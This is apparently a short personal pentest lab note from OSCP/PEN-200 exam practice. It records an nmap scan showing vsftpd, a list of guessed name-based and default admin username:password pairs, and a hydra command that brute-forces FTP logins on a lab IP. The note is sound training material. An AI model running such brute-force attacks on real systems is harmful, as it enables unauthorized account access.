# Nmap

```zsh
PORT   STATE SERVICE REASON  VERSION
21/tcp   open  ftp     vsftpd 3.0.5
```

---

# Enumeration


- may_creds.txt
```zsh
Elise.George@oscp.exam:Elise.George
Elise.George@oscp.exam:elise.george
Elise.George:Elise.George
Elise.George:elise.george
elise:elise
Elise:Elise
George:George
george:george
Jane.Perkins@oscp.exam:Jane.Perkins
Jane.Perkins@oscp.exam:jane.perkins
Jane.Perkins:Jane.Perkins
Jane.Perkins:jane.perkins
Jane:Jane
jane:jane
Perkins:Perkins
perkins:perkins
Sharon.Morgan@oscp.exam:Sharon.Morgan
Sharon.Morgan@oscp.exam:sharon.morgan
Sharon.Morgan:Sharon.Morgan
Sharon.Morgan:sharon.morgan
Sharon:Sharon
sharon:sharon
Morgan:Morgan
morgan:morgan
admin:admin
Admin:Admin
administrator:administrator
Administrator:Administrator
```

- hydra
```zsh
┌──(koshi㉿kali)-[~/PEN-200/Charlie]
└─$ hydra -C may_creds.txt ftp://192.168.115.112 -t1
```

- janeの認証情報で接続しようとするも、負荷

---

# Screenshot


